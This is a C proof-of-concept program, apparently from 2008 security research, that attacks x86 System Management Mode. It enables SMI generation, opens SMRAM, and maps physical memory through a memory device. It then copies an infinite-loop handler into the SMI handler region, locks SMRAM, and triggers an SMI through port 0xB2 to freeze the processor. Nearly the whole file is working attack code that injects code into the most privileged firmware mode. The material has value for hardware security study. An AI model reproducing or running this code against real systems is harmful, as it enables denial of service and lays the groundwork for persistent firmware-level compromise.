/*
 *
 *    Copyleft (C) 2008
 *      Andon Chauschev (D0nAnd0n) <andon.chauschev *noSPAM* rwth-aachen.de>
 *      Rodrigo Rubira Branco (BSDaemon) <rodrigo *noSPAM* risesecurity.org>
 *
 *    This program is free software; you can redistribute it and/or
 *    modify it under the terms of the GNU General Public License as
 *    published by the Free Software Foundation; either version 2 of
 *    the License, or (at your option) any later version.
 *
 *    This program is distributed in the hope that it will be
 *    useful, but WITHOUT ANY WARRANTY; without even the implied
 *    warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR
 *    PURPOSE.  See the GNU General Public License for more details.
 *
 *    You should have received a copy of the GNU General Public
 *    License along with this program; if not, write to the Free
 *    Software Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139,
 *    USA.
 *
 */

#include <pci/pci.h>  
#include <stdio.h>    /* printf() */
#include <sys/io.h>   /* inl(), outl()  */
#include <stdlib.h>   /* exit(), EXIT_SUCCESS, EXIT_FAILURE */
#include <fcntl.h>    /* open(), O_RDWR */
#include <errno.h>    /* errno */
#include <sys/mman.h> /* mmap(), munmap(), PROT_READ, PROT_WRITE, MAP_SHARED */
#include <string.h>   /* memcpy() */
#include <unistd.h>   /* close() */

#include "lib/libSMM.h"

extern char handler[], endhandler[]; /* C-code glue for the asm insert */

/* asm to "freeze" the processor - hey kiddies ;) */
asm(
	".data\n"
	".code16\n"
	".globl handler, endhandler\n"
	"\n"
	"handler:\n"
	"nop\n"
	"nop\n"
	"nop\n"
	"jmp handler\n"
	"endhandler:\n"
	"\n"
	".text\n"
	".code32\n"
);

int main(void) {
	unsigned int ACPIBASE;
	u8 smram_origvalue, smram_tmp;
	u32 smi_en_io, smi_sts_io, smi_en_origvalue, smi_en_tmp;
	int err;

	ACPIBASE = get_pmbase();
	printf("Extracted address from PMBASE: 0x%08x\n", ACPIBASE);

	smi_en_io = get_smi_en_iop();
	smi_sts_io = get_smi_sts_iop();
	printf("IO of SMI_EN  (PMBASE + 0x30): 0x%08x\n", smi_en_io);
        printf("IO of SMI_STS (PMBASE + 0x34): 0x%08x\n", smi_sts_io);

	iopl(3);

	smi_en_origvalue = inl(smi_en_io);
	printf("\nOrig. value in SMI_EN: 0x%08x\n", smi_en_origvalue);

	/* SMI enabled? */
 	err=enable_smi_gbl(smi_en_origvalue);
	if(err < 0) {
		printf("Setting GBL_SMI_EN failed. Abort.\n");
		exit(EXIT_FAILURE);
	} else if(err) 
		printf("Successfully set GBL_SMI_EN. Current value in SMI_EN: 0x%08x\n", smi_en_tmp);
	       else
		printf("GBL_SMI_EN is set: OK\n");
		
	smi_en_tmp = inl(smi_en_io);

	/* write to APM_CNT generates SMI? */
	err=enable_smi_on_apm(smi_en_tmp);
	if(err < 0) {
		printf("Setting APMC_EN failed. Abort.\n");
		exit(EXIT_FAILURE);
	} else if(err)
		printf("Successfully set APMC_EN_BIT. Current value in SMI_EN: 0x%08x\n", smi_en_tmp);
	       else
		printf("APMC_EN_BIT is set: OK\n");
		
	smi_en_tmp = inl(smi_en_io);
	printf("Current value in SMI_EN: 0x%08x\n", smi_en_tmp);

/*
 *	now SMRAM
 */
	
	printf("SMRAM_OFFSET is 0x%x\n", SMRAM_OFFSET);
	
	smram_origvalue = show_smram(NULL, (D_OPEN_BIT | D_LCK_BIT | D_CLS_BIT));

	err=open_smram();
	if(err < 0) {
		printf("Setting D_OPEN_BIT failed... Verify the D_LCK bit\n");
		exit(EXIT_FAILURE);
	} else if (err)
		printf("Successfully set D_OPEN_BIT\n");
	       else
		printf("D_OPEN_BIT is set. OK\n");

	/* OK, it seems, that SMRAM is open. now we must "inject" our code there... */
	int fd;
	unsigned char *vidmem;
	
	fd = open(MEMDEVICE, O_RDWR);

	if(fd < 0) { 
		printf("Opening %s failed, errno: %d\n", MEMDEVICE, errno); 
		exit(EXIT_FAILURE);
	}
	printf("Successfully opened %s\n", MEMDEVICE);

	vidmem = mmap(NULL, MAPPEDAREASIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, SMIINSTADDRESS);

	if(vidmem == MAP_FAILED) { 
		printf("Could not map memory area, errno: %d\n", errno); 
		exit(EXIT_FAILURE); 
	}
	printf("Successfully mapped video memory\n");
	close(fd);

	if(vidmem != memcpy(vidmem, handler, endhandler-handler)) { 
		printf("Could not copy asm to memory...\n"); 
		exit(EXIT_FAILURE); 
	}
	printf("Successfully copied asm to memory\n");

	if(munmap(vidmem, MAPPEDAREASIZE) < 0) { 	
		printf("Could not release mapped area, errno: %d\n", errno); 
		exit(EXIT_FAILURE); 
	}
	printf("Successfully closed mapped area\n");

	/* code injected. smram can be closed too */	
	printf("Closing SMRAM...\n");

	smram_tmp = show_smram(NULL, D_OPEN_BIT);

	if(close_smram() < 0) {
		printf("Could not close SMRAM. Abort.\n"); 
		exit(EXIT_FAILURE); 
	}

	smram_tmp = show_smram(NULL, D_OPEN_BIT);

	printf("SMRAM closed.\n");

	if(lock_smram() < 0) {
		printf("Could not lock SMRAM. Abort.\n"); 
		exit(EXIT_FAILURE); 
	}

	printf("SMRAM locked.\n");

	/* now trigger SMI */
	printf("Triggering SMI\n");

	/* we probe with reading/writing */
	inb(APM_CNT_IO);

	write_to_apm_cnt();

	asm(
		"inb $0xb2,%al\n"
		"movb $0xff, %al\n"
		"outb %al, $0xb2\n"
	);

	/* if it works, we dont must see this... */
	printf("Processor not freezed, failure...\n");

	exit(EXIT_FAILURE);

}
